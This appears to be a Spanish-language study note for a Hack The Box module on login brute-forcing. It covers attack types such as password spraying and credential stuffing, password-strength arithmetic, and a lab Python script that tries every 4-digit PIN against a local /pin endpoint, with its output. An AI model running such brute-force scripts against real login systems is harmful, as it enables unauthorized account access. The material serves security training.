[[Login_Brute_Forcing_Module_Cheat_Sheet.pdf]]
# Introducción
Las llaves y las contraseñas, el equivalente moderno de las cerraduras y las combinaciones, protegen el mundo digital. Pero ¿qué pasa si alguien prueba todas las combinaciones posibles hasta encontrar la que abre la puerta? Eso, en esencia, es fuerza bruta.

## ¿Qué es la fuerza bruta?
Fuerza bruta es descifrar las credenciales de acceso probando odas las combinaciones posibles de las letras de las credenciales.
El éxito de un ataque de fuerza bruta depende de varios factores, entre ellos:
- La complejidad de la contraseña o clave. Las contraseñas más largas con una combinación de letras mayúsculas y minúsculas, números y símbolos son exponencialmente más complejas de descifrar. 
- La potencia computacional disponible para el atacante. Las computadoras modernas y el hardware especializado pueden probar miles de millones de combinaciones por segundo, lo que reduce significativamente el tiempo necesario para un ataque exitoso. 
- Las medidas de seguridad implementadas. Los bloqueos de cuentas, los CAPTCHA y otras defensas pueden ralentizar o incluso frustrar los intentos de fuerza bruta.

## Cómo funciona la fuerza bruta

![[Pasted image 20241216074900.png]]
1. Inicio: el atacante inicia el proceso de fuerza bruta, a menudo con la ayuda de un software especializado. 
2. Generar combinación posible: el software genera una posible contraseña o combinación de claves en función de parámetros predefinidos, como conjuntos de caracteres y longitud. 
3. Aplicar combinación: la combinación generada se intenta contra el sistema de destino, como un formulario de inicio de sesión o un archivo cifrado. 
4. Verificar si es correcta: el sistema evalúa la combinación intentada. Si coincide con la contraseña o la clave almacenadas, se concede el acceso. De lo contrario, el proceso continúa. 
5. Acceso concedido: el atacante obtiene acceso no autorizado al sistema o a los datos. Fin: el proceso se repite, generando y probando nuevas combinaciones hasta que se encuentra la correcta o el atacante se da por vencido.
## Tipos de fuerza bruta

| Método                    | Descripción                                                                                                                                          | Ejemplo                                                                                                                                                                                                | Es mejor usarlo cuando...                                                                                                                        |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Simple Brute Force`      | Prueba sistemáticamente todas las combinaciones posibles de caracteres dentro de un conjunto de caracteres y un intervalo de longitud definidos.     | Probando todas las combinaciones de letras minúsculas de la 'a' a la 'z' para contraseñas de 4 a 6 longitudes.                                                                                         | No se dispone de información previa sobre la contraseña y los recursos computacionales son abundantes.                                           |
| `Dictionary Attack`       | Utiliza una lista precompilada de palabras, frases y contraseñas comunes.                                                                            | Probar contraseñas de una lista como 'rockyou.txt' en un formulario de inicio de sesión.                                                                                                               | Es probable que el objetivo utilice una contraseña débil o fácil de adivinar en función de patrones comunes.                                     |
| `Hybrid Attack`           | Combina elementos de fuerza bruta simple y ataques de diccionario, a menudo anexando o anteponiendo caracteres a las palabras del diccionario.       | Agregar números o caracteres especiales al final de las palabras de una lista de diccionario.                                                                                                          | El objetivo podría usar una versión ligeramente modificada de una contraseña común.                                                              |
| `Credential Stuffing`     | Aprovecha las credenciales filtradas de un servicio para intentar acceder a otros servicios, suponiendo que los usuarios reutilicen las contraseñas. | Usar una lista de nombres de usuario y contraseñas filtrados de una violación de datos para intentar iniciar sesión en varias cuentas en línea.                                                        | Hay disponible un gran conjunto de credenciales filtradas y se sospecha que el objetivo reutiliza contraseñas en varios servicios.               |
| `Password Spraying`       | Intenta un pequeño conjunto de contraseñas de uso común con un gran número de nombres de usuario.                                                    | Probar contraseñas como 'password123' o 'qwerty' en todos los nombres de usuario de una organización.                                                                                                  | Existen políticas de bloqueo de cuentas y el atacante pretende evitar la detección distribuyendo los intentos entre varias cuentas.              |
| `Rainbow Table Attack`    | Utiliza tablas precalculadas de hashes de contraseñas para revertir hashes y recuperar contraseñas de texto no cifrado rápidamente.                  | Precálculo de hashes para todas las contraseñas posibles de una determinada longitud y conjunto de caracteres, y luego comparación de los hashes capturados con la tabla para encontrar coincidencias. | Es necesario descifrar una gran cantidad de hashes de contraseñas y hay espacio de almacenamiento disponible para las tablas arcoíris.           |
| `Reverse Brute Force`     | Dirige una sola contraseña a varios nombres de usuario, que a menudo se utilizan junto con ataques de relleno de credenciales.                       | Usar una contraseña filtrada de un servicio para intentar iniciar sesión en varias cuentas con diferentes nombres de usuario.                                                                          | Existe una fuerte sospecha de que una contraseña en particular se está reutilizando en varias cuentas.                                           |
| `Distributed Brute Force` | Distribuye la carga de trabajo de fuerza bruta entre varios equipos o dispositivos para acelerar el proceso.                                         | El uso de un clúster de equipos para realizar un ataque de fuerza bruta aumenta significativamente el número de combinaciones que se pueden intentar por segundo.                                      | La contraseña o clave de destino es muy compleja, y una sola máquina carece de la potencia computacional para descifrarla en un plazo razonable. |
## Fundamentos de seguridad de contraseñas
La eficacia de los ataques de fuerza bruta depende de la solidez de las contraseñas a las que se dirigen. Comprender los aspectos básicos de la seguridad de las contraseñas es fundamental para apreciar la importancia de las prácticas sólidas en materia de contraseñas y los desafíos que plantean los ataques de fuerza bruta.

## La importancia de las contraseñas seguras
Dado por hecho que las contraseñas son la primera Linea de defensa, se sugiere que estas sean extremadamente seguras siguiendo las recomendaciones del `NIST` (Instituto Nacional de Estándares y Tecnología)

## La anatomía de una contraseña segura
El `NIST` proporciona pautas para crear una contraseña segura y estas son:
- Length
- Complejidad
- Unicidad
- Aleatoriedad
son los criterios que debe cumplir las contraseñas segun el NIST

## Debilidades comunes de las contraseñas
- Contraseñas cortas: las contraseñas con menos de ocho caracteres son particularmente vulnerables a ataques de fuerza bruta, ya que la cantidad de combinaciones posibles es relativamente pequeña. 
- Palabras y frases comunes: el uso de palabras, nombres o frases comunes del diccionario como contraseñas las hace susceptibles a ataques de diccionario, en los que los atacantes prueban una lista predefinida de contraseñas comunes. 
- Información personal: la incorporación de información personal como fechas de nacimiento, nombres de mascotas o direcciones en las contraseñas hace que sean más fáciles de adivinar, especialmente si esta información está disponible públicamente en las redes sociales u otras plataformas en línea. 
- Reutilización de contraseñas: el uso de la misma contraseña en varias cuentas es riesgoso. Si una cuenta se ve comprometida, todas las demás cuentas que usan la misma contraseña también corren riesgo. 
- Patrones predecibles: el uso de patrones como "qwerty" o "123456" o sustituciones simples como "p@ssw0rd" hace que las contraseñas sean fáciles de adivinar, ya que estos patrones son bien conocidos por los atacantes.
## Políticas de contraseñas 
Las organizaciones suelen implementar políticas de contraseñas para hacer cumplir el uso de contraseñas seguras. Estas políticas suelen incluir requisitos para: 
- Longitud mínima: la cantidad mínima de caracteres que debe tener una contraseña. 
- Complejidad: los tipos de caracteres que deben incluirse en una contraseña (por ejemplo, mayúsculas, minúsculas, números, símbolos). 
- Caducidad de la contraseña: la frecuencia con la que se deben cambiar las contraseñas. 
- Historial de contraseñas: la cantidad de contraseñas anteriores que no se pueden reutilizar.

## Ataques de fuerza bruta

Para tener una comprensión exacta de los ataques de fuerza bruta, es necesario tener conocimiento en `matemáticas` 
Formula para calcular el número de combinaciones para una contraseña
```python
Combinaciones posibles = Tamaño del conjunto de caracteres^Longitud de la contraseña
```

tabla que ilustra el numero de combinaciones posibles

| Longitud de la contraseña | numero de caracteres | Posibles combinaciones                                |                                     |
| ------------------------- | -------------------- | ----------------------------------------------------- | ----------------------------------- |
| `Short and Simple`        | 6                    | Letras minúsculas (a-z)                               | 26^6 = 308.915.776                  |
| `Longer but Still Simple` | 8                    | Letras minúsculas (a-z)                               | 26^8 = 208.827.064.576              |
| `Adding Complexity`       | 8                    | Letras minúsculas y mayúsculas (a-z, A-Z)             | 52^8 = 53.459.728.531.456           |
| `Maximum Complexity`      | 12                   | Letras, números y símbolos en minúsculas y mayúsculas | 94^12 = 475.920.493.781.698.549.504 |
Como se ve en la tabla el numero de combinaciones posibles crece por el aumento de numero de caracteres esto hace que el espacio de búsqueda crezca, esto hace que el descifrado de contraseñas sea mas difícil cada vez, pero el tiempo que lleva descifrar una contraseña depende de el tamaño del espacio de búsqueda, la potencia computacional del atacante
Este tipo de ataques puede llevarle años a una sola computadora, debido a esto se recurre al uso de redes distribuidas lo que permite reducir el tiempo  de descifrado.
![[Pasted image 20241223084255.png]]
En el grafico se puede ver la diferencia entre una computadora básica y una super computadora
- Computadora básica (1 millón de contraseñas por segundo): adecuada para descifrar contraseñas simples rápidamente, pero resulta imprácticamente lenta para contraseñas complejas. Por ejemplo, descifrar una contraseña de 8 caracteres usando letras y dígitos llevaría aproximadamente 6,92 años. 
- Supercomputadora (1 billón de contraseñas por segundo): reduce drásticamente los tiempos de descifrado de contraseñas más simples. Sin embargo, incluso con esta inmensa potencia, descifrar contraseñas altamente complejas puede llevar una cantidad de tiempo impráctica. Por ejemplo, una contraseña de 12 caracteres con todos los caracteres ASCII aún tardaría unos 15.000 años en descifrarse.
### Descifrando el PIN

La aplicación de instancia genera un PIN aleatorio de 4 dígitos y expone un punto final (/pin) que acepta un PIN como parámetro de consulta. Si el PIN proporcionado coincide con el generado, la aplicación responde con un mensaje de éxito y una bandera. De lo contrario, devuelve un mensaje de error. 
Usaremos este sencillo script de demostración de Python para forzar el punto final /pin en la API. Copie y pegue este script de Python a continuación como pin-solver.py en su máquina. Solo necesita modificar las variables de IP y puerto para que coincidan con la información de su sistema de destino.
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

El script de Python itera sistemáticamente todos los PIN de 4 dígitos posibles (0000 a 9999) y envía solicitudes GET al punto final de Flask con cada PIN. Verifica el código de estado de respuesta y el contenido para identificar el PIN correcto y capturar el indicador asociado.

<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Brute Force Attacks</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">1i8n@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python pin-solver.py</span></span>

<span class="token output">...
Attempted PIN: 4039
Attempted PIN: 4040
Attempted PIN: 4041
Attempted PIN: 4042
Attempted PIN: 4043
Attempted PIN: 4044
Attempted PIN: 4045
Attempted PIN: 4046
Attempted PIN: 4047
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
</span></code></pre></div></div>

El resultado del script mostrará la progresión del ataque de fuerza bruta, mostrando cada PIN intentado y su resultado correspondiente. El resultado final revelará el PIN correcto y la bandera capturada, demostrando la finalización exitosa del ataque de fuerza bruta.
